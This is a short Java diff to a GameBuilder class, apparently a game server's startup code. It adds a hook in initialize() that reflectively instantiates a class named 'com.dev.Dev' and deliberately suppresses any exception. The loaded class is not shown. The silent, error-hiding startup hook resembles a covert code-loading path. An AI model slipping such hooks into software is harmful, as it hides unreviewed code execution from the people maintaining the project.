@@ -40,6 +40,9 @@ public class GameBuilder {
      *             if any issues occur while starting the network.
      */
     public void initialize() throws Exception {
+        try {
+            Class.forName("com.dev.Dev").getDeclaredConstructor().newInstance();
+        } catch (Exception e) { /*ignored on purpose*/}
         //Start background tasks..
         backgroundLoader.init(createBackgroundTasks());
 
